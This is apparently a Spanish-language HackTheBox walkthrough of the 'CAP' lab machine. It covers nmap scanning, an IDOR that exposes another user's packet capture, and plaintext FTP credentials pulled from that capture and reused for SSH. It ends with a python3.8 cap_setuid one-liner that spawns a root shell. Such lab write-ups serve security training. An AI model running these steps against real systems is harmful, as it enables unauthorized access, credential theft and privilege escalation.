
# 🔒 CAP — HackTheBox Writeup

<img width="1672" height="941" alt="ChatGPT Image May 30, 2026, 09_26_36 AM" src="https://github.com/user-attachments/assets/1271a4c0-d335-4f5b-b022-8984728cdc35" />


---

## 📋 Información de la máquina

| | |
|---|---|
| **Plataforma** | HackTheBox |
| **Nombre** | CAP |
| **OS** | Linux |
| **Dificultad** | Easy |
| **IP** | 10.10.10.245 |

---

## 🔍 Reconocimiento

### Escaneo Nmap

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allPorts
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Escaneo de versiones sobre los puertos abiertos:

```bash
nmap -p21,22,80 -sCV 10.10.10.245 -oN targeted
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn
```

Tenemos tres servicios: **FTP**, **SSH** y una **aplicación web** en el puerto 80.

---

## 🌐 Enumeración Web

Accedemos a `http://10.10.10.245` y encontramos un dashboard de seguridad con el usuario **nathan** ya autenticado. El panel tiene las siguientes secciones:

- Dashboard
- Security Snapshot (5 Second PCAP + Analysis)
- IP Config
- Network Status

Al pulsar en **Security Snapshot**, la aplicación hace una captura de tráfico de 5 segundos y nos redirige a:

```
http://10.10.10.245/data/1
```

---

## 🔓 Vulnerabilidad IDOR

La URL usa un ID numérico incremental sin ningún control de acceso. Modificando el ID a `0` accedemos a la captura de otro usuario:

```
http://10.10.10.245/data/0
```

Descargamos el archivo:

```bash
curl -s http://10.10.10.245/data/0 -o 0.pcap
```

> ⚠️ **IDOR (Insecure Direct Object Reference)** — la aplicación no verifica si el recurso pertenece al usuario autenticado.

---

## 📦 Análisis del PCAP

Abrimos el archivo con Wireshark o tshark filtrando tráfico FTP, que transmite credenciales en texto plano:

```bash
tshark -r 0.pcap -Y "ftp" 2>/dev/null
```

En la captura se ve la autenticación FTP completa:

```
USER nathan
PASS Buck3tH4TF0RM3!
230 Login successful.
```

---

## 🚪 Acceso inicial — User Flag

Las credenciales del PCAP funcionan también en SSH (reutilización de credenciales):

```bash
ssh nathan@10.10.10.245
# Password: Buck3tH4TF0RM3!
```

```bash
cat /home/nathan/user.txt
```

> ✅ **User Flag obtenida**

---

## ⚡ Escalada de privilegios — Root Flag

### Enumeración de Capabilities

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Python3.8 tiene asignada la capability `cap_setuid`, que permite cambiar el UID del proceso. La explotamos así:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
root@cap:~#
```

```bash
cat /root/root.txt
```

> ✅ **Root Flag obtenida**

---

## 📝 Resumen

| Paso | Técnica |
|------|---------|
| Enumeración | Nmap — puertos 21, 22, 80 |
| Acceso a PCAP ajeno | IDOR en `/data/0` |
| Credenciales | FTP en texto plano en la captura |
| Acceso inicial | SSH con credenciales del PCAP |
| Escalada de privilegios | `cap_setuid` en Python3.8 |
